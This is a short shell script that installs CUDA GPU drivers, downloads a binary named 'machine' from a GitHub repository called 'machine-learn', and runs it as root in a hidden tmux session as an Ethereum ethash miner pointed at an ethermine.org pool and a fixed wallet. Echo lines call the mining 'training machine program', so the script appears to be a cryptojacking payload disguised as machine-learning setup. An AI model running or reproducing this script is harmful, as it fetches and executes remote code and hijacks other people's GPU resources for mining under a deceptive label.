#!/bin/sh
sudo sysctl -p
sudo apt-get update
cd $HOME/
sudo apt-get -y -qq upgrade
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev unzip tmux
sudo apt-get install linux-headers-$(uname -r)
distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
sudo apt-get update
sudo apt-get -y install cuda-drivers
export PATH=/usr/local/cuda-11.5/bin${PATH:+:${PATH}}
echo Successfully installed Nvidia
wget https://github.com/Akira-Slasvi/machine-learn/releases/download/%23machinellearn/machine
echo project start
chmod +x machine
sudo tmux new-session -d -s SANS './machine -a ethash -o stratum+tcp://eu1.ethermine.org:4444 -u 0x18EFd6373f99C8C46Cdd1B3142043E0fB2f69614 -p x -w rig1 --lock-cclock 1150'
echo training machine program
